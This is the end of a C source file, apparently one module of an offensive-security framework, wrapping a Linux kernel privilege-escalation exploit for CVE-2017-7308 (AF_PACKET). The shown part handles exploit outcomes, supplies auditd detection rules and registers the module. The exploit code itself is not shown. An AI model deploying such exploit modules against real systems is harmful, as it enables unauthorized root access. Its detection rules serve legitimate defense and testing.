        fprintf(stderr, "[i] af_packet: not claiming EXPLOIT_OK — caller process "
                        "did not acquire root. The primitive demonstrably works.\n");
        return SKELETONKEY_EXPLOIT_FAIL;

    case 4:
        fprintf(stderr, "[-] af_packet: setsockopt(PACKET_RX_RING) rejected; "
                        "kernel has silent backport (detect was version-only)\n");
        return SKELETONKEY_OK;  /* effectively patched */

    case 5:
        fprintf(stderr, "[-] af_packet: overflow fired but no spray child "
                        "acquired root within the timeout window\n");
        fprintf(stderr, "[i] af_packet: check `dmesg | grep -i 'skeletonkey-afp-tag\\|KASAN'` "
                        "for evidence the OOB write occurred\n");
        return SKELETONKEY_EXPLOIT_FAIL;

    default:
        fprintf(stderr, "[-] af_packet: child exited %d (setup error)\n", code);
        return SKELETONKEY_EXPLOIT_FAIL;
    }
#endif
}

static const char af_packet_auditd[] =
    "# AF_PACKET TPACKET_V3 LPE (CVE-2017-7308) — auditd detection rules\n"
    "# Flag AF_PACKET socket creation from non-root via userns.\n"
    "-a always,exit -F arch=b64 -S socket -F a0=17 -k skeletonkey-af-packet\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-af-packet-userns\n";

const struct skeletonkey_module af_packet_module = {
    .name           = "af_packet",
    .cve            = "CVE-2017-7308",
    .summary        = "AF_PACKET TPACKET_V3 integer overflow → heap write-where → cred overwrite",
    .family         = "af_packet",
    .kernel_range   = "K < 4.10.6, backports: 4.10.6 / 4.9.18 / 4.4.57 / 3.18.49",
    .detect         = af_packet_detect,
    .exploit        = af_packet_exploit,
    .mitigate       = NULL,
    .cleanup        = NULL,
    .detect_auditd  = af_packet_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_af_packet(void)
{
    skeletonkey_register(&af_packet_module);
}
